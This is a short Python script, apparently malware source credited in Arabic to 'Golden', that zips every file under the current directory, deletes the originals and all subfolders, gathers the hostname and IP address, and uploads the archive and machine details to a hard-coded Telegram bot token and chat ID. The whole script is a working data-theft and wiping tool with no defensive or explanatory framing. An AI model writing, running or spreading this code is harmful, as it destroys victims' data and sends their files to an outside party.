import os
import random
import string
import shutil
import requests
import socket
import pyminizip
from concurrent.futures import ThreadPoolExecutor
GoldTok = '7088045919:AAETb1CZBlZWk_kIm5ES8xZEaetQ1ytE9m4'
GoldID = '5487978588'

def compress_files(args):
    files, output_zip, password = args
    pyminizip.compress_multiple(files, [], output_zip, None, 5)
    return output_zip

def Golden2(GoldZip):
    files = []
    for root, dirs, files_in_dir in os.walk("."):
        for file in files_in_dir:
            file_path = os.path.join(root, file)
            if not file_path.endswith('.zip'):
                files.append(file_path)
    num_workers = 4 
    chunk_size = max(1, len(files) // (num_workers * 2))
    chunks = [files[i:i + chunk_size] for i in range(0, len(files), chunk_size)]
    args = [(chunk, f"{GoldZip}_{i}.zip", None) for i, chunk in enumerate(chunks)]
    
    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        temp_zips = list(executor.map(compress_files, args))
    
    pyminizip.compress_multiple(temp_zips, [], GoldZip, None, 5)
    for temp_zip in temp_zips:
        os.remove(temp_zip)

def Golden3(GoldZip):
    for root, dirs, files in os.walk("."):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path != GoldZip and not file_path.endswith('.zip'):
                os.remove(file_path)
        for dir in dirs:
            shutil.rmtree(os.path.join(root, dir))

def Golden4():
    GoldDv = socket.gethostname()
    Goldip = socket.gethostbyname(GoldDv)
    return GoldDv, Goldip

def Golden5(GoldPas, GoldDv, Goldip):
    message = f"password : {GoldPas}\nDevice : {GoldDv}\nip_Address : {Goldip}\n"
    url = f"https://api.telegram.org/bot{GoldTok}/sendMessage"
    data = {"chat_id": GoldID, "text": message}
    response = requests.post(url, data=data)

def Golden6(GoldZip):
    url = f"https://api.telegram.org/bot{GoldTok}/sendDocument"
    with open(GoldZip, "rb") as document:
        files = {"document": document}
        data = {"chat_id": GoldID}
        response = requests.post(url, files=files, data=data)

def Xdevloper():
    GoldZip = "ATUM-TUMB.zip"
    if os.path.exists(GoldZip):
        os.remove(GoldZip)
    
    Golden2(GoldZip)
    Golden3(GoldZip)
    GoldDv, Goldip = Golden4()
    Golden5("", GoldDv, Goldip)
    Golden6(GoldZip)

if __name__ == "__main__":
    Xdevloper()

# بواسطة - Golden
# تليجرام - @rrrrrf
